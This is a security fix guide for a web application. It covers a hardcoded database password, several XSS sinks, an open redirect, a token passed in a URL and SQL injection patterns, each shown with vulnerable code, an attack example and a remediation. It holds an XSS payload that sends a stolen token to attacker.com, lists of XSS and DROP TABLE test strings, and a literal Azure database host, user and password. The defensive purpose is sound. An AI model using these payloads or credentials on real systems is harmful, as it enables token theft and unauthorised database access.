# Security Issues - Detailed Fix Guide

## Issue #1: Hardcoded Database Password

### Location
File: `init-azure-db.py`, Line 9

### Current Code
```python
DB_HOST = "mew-db-dev.postgres.database.azure.com"
DB_USER = "mewadmin"
DB_PASSWORD = "MewDev2024SecurePass"  # ❌ EXPOSED
DB_NAME = "mew_db"
```

### Problem
- Password is visible in source code
- Will be exposed in Git history forever
- Anyone with repo access has database credentials
- Cannot rotate password without changing code

### Fix
```python
import os
from dotenv import load_dotenv

load_dotenv()

DB_HOST = os.getenv("DB_HOST", "localhost")
DB_USER = os.getenv("DB_USER", "postgres")
DB_PASSWORD = os.getenv("DB_PASSWORD")  # ✅ From environment
DB_NAME = os.getenv("DB_NAME", "mew_db")

if not DB_PASSWORD:
    raise ValueError("DB_PASSWORD environment variable must be set")
```

### Environment Setup
Create `.env` or set in deployment:
```bash
export DB_PASSWORD="your-secure-password-here"
```

---

## Issue #2: XSS in OAuth Dashboard (oauth_web.py:350)

### Location
File: `app/routers/oauth_web.py`, Line 350

### Current Code
```javascript
function displayUserInfo(user) {
    document.getElementById('userInfo').innerHTML = `
        <h3>👤 ${user.full_name}</h3>
        <p><strong>Email:</strong> ${user.email}</p>
        <p><strong>Role:</strong> ${user.role}</p>
        ${user.federated_provider ? `<p><strong>Provider:</strong> ${user.federated_provider}</p>` : ''}
    `;  // ❌ UNSAFE: innerHTML allows HTML/JS injection
}
```

### Attack Example
If `user.full_name` contains:
```
"><script>fetch('/api/tokens', {headers: {'Authorization': 'Bearer ' + localStorage.getItem('mew_token')}}).then(r => r.text()).then(t => fetch('https://attacker.com/steal?token=' + t))</script>
```

The JavaScript will be executed and tokens stolen.

### Fix - Safe DOM Method
```javascript
function displayUserInfo(user) {
    const userInfoDiv = document.getElementById('userInfo');
    
    // Clear previous content
    userInfoDiv.innerHTML = '';
    
    // Create elements safely using DOM API
    const h3 = document.createElement('h3');
    h3.textContent = '👤 ' + (user.full_name || 'User');
    userInfoDiv.appendChild(h3);
    
    const emailP = document.createElement('p');
    emailP.innerHTML = '<strong>Email:</strong> '; // Safe: only HTML structure
    const emailText = document.createTextNode(user.email || 'N/A');
    emailP.appendChild(emailText);
    userInfoDiv.appendChild(emailP);
    
    const roleP = document.createElement('p');
    roleP.innerHTML = '<strong>Role:</strong> '; // Safe: only HTML structure
    const roleText = document.createTextNode(user.role || 'N/A');
    roleP.appendChild(roleText);
    userInfoDiv.appendChild(roleP);
    
    if (user.federated_provider) {
        const providerP = document.createElement('p');
        providerP.innerHTML = '<strong>Provider:</strong> '; // Safe
        const providerText = document.createTextNode(user.federated_provider);
        providerP.appendChild(providerText);
        userInfoDiv.appendChild(providerP);
    }
}
```

### Alternative: Template with Sanitization
```javascript
function sanitizeHTML(text) {
    // Escape HTML special characters
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function displayUserInfo(user) {
    document.getElementById('userInfo').innerHTML = `
        <h3>👤 ${sanitizeHTML(user.full_name || '')}</h3>
        <p><strong>Email:</strong> ${sanitizeHTML(user.email || '')}</p>
        <p><strong>Role:</strong> ${sanitizeHTML(user.role || '')}</p>
        ${user.federated_provider ? `<p><strong>Provider:</strong> ${sanitizeHTML(user.federated_provider)}</p>` : ''}
    `;
}
```

---

## Issue #3: XSS in OAuth Success Page (oauth_success_page.py)

### Location
File: `app/routers/oauth_success_page.py`, Line 74

### Current Code
```python
def get_success_page(user_name: str, user_email: str, jwt_token: str) -> str:
    return f"""
    <!DOCTYPE html>
    ...
    <p class="subtitle">
        Hi {user_name}!<br>  <!-- ❌ UNSAFE -->
        Your Google Calendar is connected.
    </p>
    ...
    <script>
        localStorage.setItem('mew_token', '{jwt_token}');  <!-- ❌ UNSAFE -->
        localStorage.setItem('mew_user', '{user_email}');   <!-- ❌ UNSAFE -->
        localStorage.setItem('mew_name', '{user_name}');    <!-- ❌ UNSAFE -->
    </script>
    """
```

### Attack Example
If `user_name` contains: `John'); alert('XSS'); ('`
Result becomes:
```javascript
localStorage.setItem('mew_name', 'John'); alert('XSS'); ('');
```

### Fix - Python Side (Server-side Escaping)
```python
import json
import html

def get_success_page(user_name: str, user_email: str, jwt_token: str) -> str:
    # Escape for HTML context
    user_name_safe = html.escape(user_name)
    user_email_safe = html.escape(user_email)
    jwt_token_safe = html.escape(jwt_token)
    
    # Or use JSON encoding for JavaScript (preferred for strings in JS)
    return f"""
    <!DOCTYPE html>
    ...
    <p class="subtitle">
        Hi {user_name_safe}!<br>
        Your Google Calendar is connected.
    </p>
    ...
    <script>
        // Use JSON.stringify to safely encode strings for JavaScript
        localStorage.setItem('mew_token', {json.dumps(jwt_token)});
        localStorage.setItem('mew_user', {json.dumps(user_email)});
        localStorage.setItem('mew_name', {json.dumps(user_name)});
    </script>
    """
```

### Better Fix - Return JSON + Separate Script
```python
from fastapi.responses import HTMLResponse, JSONResponse
import json

def get_success_page(user_name: str, user_email: str, jwt_token: str) -> str:
    # Safely encode user data as JSON
    user_data = json.dumps({
        'name': user_name,
        'email': user_email,
        'token': jwt_token
    })
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>✅ Connected!</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <style>
            /* ... styles ... */
        </style>
    </head>
    <body>
        <div class="container">
            <div class="icon">🎉</div>
            <h1>Success!</h1>
            <p class="subtitle" id="greeting"></p>
            <!-- ... rest of HTML ... -->
        </div>

        <script>
            // Safely parse JSON data
            const userData = {user_data};  // This is valid JSON
            
            // Use DOM API for safe insertion
            document.getElementById('greeting').textContent = 'Hi ' + userData.name + '! Your Google Calendar is connected.';
            
            // Save to localStorage
            localStorage.setItem('mew_token', userData.token);
            localStorage.setItem('mew_user', userData.email);
            localStorage.setItem('mew_name', userData.name);
            
            // Auto-download logic...
        </script>
    </body>
    </html>
    """
```

---

## Issue #4: XSS in Calendar Web Page (calendar_web.py:192)

### Location
File: `app/routers/calendar_web.py`, Line 192

### Current Code
```javascript
function showMessage(text, type) {
    const msg = document.getElementById('message');
    msg.className = 'message ' + type;
    msg.innerHTML = text;  // ❌ UNSAFE
}

// Called with error messages:
.catch(error => {
    document.getElementById('loading').style.display = 'none';
    showMessage('❌ ' + error.message, 'error');  // ❌ error.message might contain HTML
});
```

### Problem
If API returns error: `{"detail": "<img src=x onerror='alert(1)'>"}`
Then `error.message` contains HTML that gets executed.

### Fix
```javascript
function showMessage(text, type) {
    const msg = document.getElementById('message');
    msg.className = 'message ' + type;
    msg.textContent = text;  // ✅ Safe: text only, no HTML parsing
}

// Or use innerHTML with sanitization:
function sanitizeHTML(dirty) {
    const div = document.createElement('div');
    div.textContent = dirty;
    return div.innerHTML;
}

function showMessage(text, type) {
    const msg = document.getElementById('message');
    msg.className = 'message ' + type;
    msg.innerHTML = sanitizeHTML(text);
}
```

---

## Issue #5: XSS in Debug Page (debug_page.py:87)

### Location
File: `app/routers/debug_page.py`, Line 87

### Current Code
```javascript
function log(msg, type = 'normal') {
    const timestamp = new Date().toLocaleTimeString();
    let color = '';
    if (type === 'success') color = 'success';
    if (type === 'error') color = 'error';
    if (type === 'warning') color = 'warning';
    
    output.innerHTML += `<span class="${color}">[${timestamp}] ${msg}</span>\n`;  // ❌ UNSAFE
    output.scrollTop = output.scrollHeight;
}
```

### Fix - Safe DOM Manipulation
```javascript
function log(msg, type = 'normal') {
    const timestamp = new Date().toLocaleTimeString();
    let colorClass = '';
    if (type === 'success') colorClass = 'success';
    if (type === 'error') colorClass = 'error';
    if (type === 'warning') colorClass = 'warning';
    
    // Create new line element safely
    const span = document.createElement('span');
    span.className = colorClass;
    span.textContent = `[${timestamp}] ${msg}`;
    
    const newline = document.createElement('div');
    newline.appendChild(span);
    
    output.appendChild(newline);
    output.scrollTop = output.scrollHeight;
}
```

---

## Issue #6 & #7: Open Redirect & Token in URL

### Location
File: `app/routers/oauth_web.py`, Lines 218 and 250

### Current Code
```python
@router.get("/login/{provider}")
async def oauth_provider_login(provider: str, redirect_uri: str, db: Session = Depends(get_db)):
    """Initiate OAuth flow for a provider"""
    try:
        auth_url = await OAuthService.get_authorization_url(provider, redirect_uri)
        return RedirectResponse(url=auth_url)  # ❌ No validation of redirect_uri

@router.get("/callback/{provider}")
async def oauth_callback(request: Request, provider: str, code: str, state: str = None, db: Session = Depends(get_db)):
    # ...
    dashboard_url = f"/auth/oauth/dashboard?token={result['access_token']}"  # ❌ Token in URL
    response = RedirectResponse(url=dashboard_url)  # ❌ Gets logged, cached, exposed
```

### Fix
```python
from urllib.parse import urlparse, urljoin
from fastapi import HTTPException
from app.utils.config import settings

def is_safe_redirect(url: str) -> bool:
    """Validate redirect URL is same-origin"""
    parsed = urlparse(url)
    
    # Allow only relative URLs or same origin
    if parsed.scheme and parsed.scheme not in ('http', 'https'):
        return False
    
    if parsed.netloc:
        # Must match allowed origins
        allowed_origins = [
            urlparse(settings.BASE_URL).netloc,
            'localhost:3000',
            'localhost:8000',
        ]
        return parsed.netloc in allowed_origins
    
    return True

@router.get("/login/{provider}")
async def oauth_provider_login(provider: str, redirect_uri: str, db: Session = Depends(get_db)):
    """Initiate OAuth flow for a provider"""
    try:
        # Validate redirect_uri is from allowed origins
        if not is_safe_redirect(redirect_uri):
            raise HTTPException(status_code=400, detail="Invalid redirect URI")
        
        auth_url = await OAuthService.get_authorization_url(provider, redirect_uri)
        return RedirectResponse(url=auth_url)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"OAuth authentication failed: {str(e)}")

@router.get("/callback/{provider}")
async def oauth_callback(request: Request, provider: str, code: str, state: str = None, db: Session = Depends(get_db)):
    """Handle OAuth callback from provider"""
    try:
        scheme = request.headers.get("x-forwarded-proto", request.url.scheme)
        host = request.headers.get("host") or request.url.netloc
        redirect_uri = f"{scheme}://{host}/auth/oauth/callback/{provider}"
        
        result = await OAuthService.handle_callback(provider, code, redirect_uri, db)
        
        # ✅ FIX 1: Don't put token in URL, use HTTP-only cookie instead
        response = RedirectResponse(url="/auth/oauth/dashboard")
        
        # ✅ FIX 2: Use secure, HTTP-only cookie
        response.set_cookie(
            key="mew_token",
            value=result["access_token"],
            httponly=True,      # JavaScript cannot access
            secure=True,        # HTTPS only
            samesite="lax"      # CSRF protection
        )
        
        # Optional: Store user info in session
        response.set_cookie(
            key="mew_user_email",
            value=result.get("email", ""),
            httponly=True,
            secure=True,
            samesite="lax"
        )
        
        return response
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"OAuth authentication failed: {str(e)}")
```

### JavaScript Side Update
```javascript
// Instead of reading token from URL query params
function getTokenFromURL() {
    // ❌ OLD: Gets token from ?token=xxx
    const params = new URLSearchParams(window.location.search);
    return params.get('token');
}

// ✅ NEW: Token is in HTTP-only cookie, JavaScript cannot access it
// Instead, use credentials: 'include' in fetch calls:
async function loadUserInfo() {
    try {
        const response = await fetch(`${API_URL}/auth/me`, {
            credentials: 'include',  // ✅ Sends HTTP-only cookies automatically
            headers: { 'Accept': 'application/json' }
        });
        
        if (response.ok) {
            const user = await response.json();
            localStorage.setItem('mew_user_email', user.email);  // Non-sensitive data OK in localStorage
            displayUserInfo(user);
        } else {
            window.location.href = '/auth/oauth/login';
        }
    } catch (error) {
        console.error('Error loading user:', error);
        window.location.href = '/auth/oauth/login';
    }
}
```

---

## Issue #8: SQL Injection Pattern (init-azure-db.py:28)

### Location
File: `init-azure-db.py`, Line 28

### Current Code
```python
cursor.execute(f"CREATE DATABASE {DB_NAME}")  # ❌ String interpolation
```

### Problem
While `DB_NAME` is hardcoded here, if it ever becomes user-configurable:
```
DB_NAME = "test'; DROP TABLE users; --"
# Results in: CREATE DATABASE test'; DROP TABLE users; --
```

### Fix - PostgreSQL Identifier
```python
import psycopg2.sql

# ✅ Safe: Uses proper identifier quoting
cursor.execute(
    psycopg2.sql.SQL("CREATE DATABASE {}").format(
        psycopg2.sql.Identifier(DB_NAME)
    )
)

# Produces: CREATE DATABASE "test'; DROP TABLE users; --"
# The semicolon and comments are now literal text, not SQL commands
```

---

## Issue #9: Arbitrary SQL Execution (init-federated-fix.py)

### Location
File: `init-federated-fix.py`, Lines 22-24

### Current Code
```python
with open('fix_federated_id.sql', 'r') as f:
    sql = f.read()
    cursor.execute(sql)  # ❌ Arbitrary SQL from file
```

### Problem
- No validation of SQL contents
- If file is modified (by attacker or accident), dangerous SQL runs
- No audit trail of what SQL was executed
- Hard to debug if something goes wrong

### Fix - Validation and Logging
```python
import hashlib
import logging

logger = logging.getLogger(__name__)

# Define expected checksums for SQL files
EXPECTED_SQL_CHECKSUMS = {
    'fix_federated_id.sql': 'abc123def456...'  # SHA256 hash of original file
}

def load_and_verify_sql(filename: str) -> str:
    """Load SQL from file with integrity verification"""
    
    # 1. Check file exists
    if not os.path.exists(filename):
        raise FileNotFoundError(f"SQL file not found: {filename}")
    
    # 2. Read file
    with open(filename, 'r') as f:
        sql = f.read()
    
    # 3. Verify integrity (optional but recommended)
    file_hash = hashlib.sha256(sql.encode()).hexdigest()
    expected = EXPECTED_SQL_CHECKSUMS.get(filename)
    
    if expected and file_hash != expected:
        raise ValueError(f"SQL file integrity check failed for {filename}")
    
    # 4. Basic validation - ensure file isn't too large
    if len(sql) > 1_000_000:  # 1MB max
        raise ValueError(f"SQL file too large: {filename}")
    
    return sql

def execute_sql_file(cursor, filename: str):
    """Execute SQL from file with logging and validation"""
    
    sql = load_and_verify_sql(filename)
    
    # Parse and validate SQL statements
    statements = sql.split(';')
    
    for i, statement in enumerate(statements):
        statement = statement.strip()
        
        if not statement:
            continue
        
        # Log what we're about to execute (for audit trail)
        logger.info(f"Executing SQL statement {i+1}: {statement[:100]}...")
        
        try:
            cursor.execute(statement)
            logger.info(f"✅ Statement {i+1} executed successfully")
        except Exception as e:
            logger.error(f"❌ Statement {i+1} failed: {e}")
            raise

# Usage
try:
    conn = get_db_connection()
    cursor = conn.cursor()
    
    execute_sql_file(cursor, 'fix_federated_id.sql')
    
    conn.commit()
    logger.info("✅ All SQL statements executed successfully")
    
except Exception as e:
    conn.rollback()
    logger.error(f"❌ Error executing SQL: {e}")
    raise
finally:
    cursor.close()
    conn.close()
```

---

## Testing the Fixes

### Test for XSS
```javascript
// Add to test suite
const xssPayloads = [
    '"><script>alert("XSS")</script>',
    'javascript:alert(1)',
    '<img src=x onerror="alert(1)">',
    '<svg onload="alert(1)">',
    '"; alert("XSS"); //',
    "'; alert('XSS'); //",
];

xssPayloads.forEach(payload => {
    // Test that payload is escaped or sanitized
    const result = sanitizeHTML(payload);
    // Should NOT contain <script>, javascript:, onerror, onload, etc.
    assert(!result.includes('<script>'));
    assert(!result.includes('javascript:'));
    assert(!result.includes('onerror='));
    assert(!result.includes('onload='));
});
```

### Test for SQL Injection
```python
# Add to test suite
from init_azure_db import is_safe_database_name

# Should reject dangerous names
dangerous_names = [
    "test'; DROP TABLE users; --",
    "test\"; DROP TABLE users; --",
    "test\\'; DROP TABLE users; --",
    "test*; DROP TABLE users; --",
]

for name in dangerous_names:
    with pytest.raises(ValueError):
        create_database(name)
```

---

## Summary of Changes

| Issue | File | Fix Type | Priority |
|-------|------|----------|----------|
| Hardcoded Password | init-azure-db.py | Use env vars | CRITICAL |
| XSS Dashboard | oauth_web.py | Use textContent/DOM API | CRITICAL |
| XSS Success Page | oauth_success_page.py | Use JSON encoding | CRITICAL |
| XSS Calendar | calendar_web.py | Use textContent | HIGH |
| XSS Debug | debug_page.py | Use DOM API | HIGH |
| Open Redirect | oauth_web.py | Validate redirect_uri | HIGH |
| Token in URL | oauth_web.py | Use HTTP-only cookies | HIGH |
| SQL Injection | init-azure-db.py | Use sql.Identifier | MEDIUM |
| Arbitrary SQL | init-federated-fix.py | Add validation | MEDIUM |

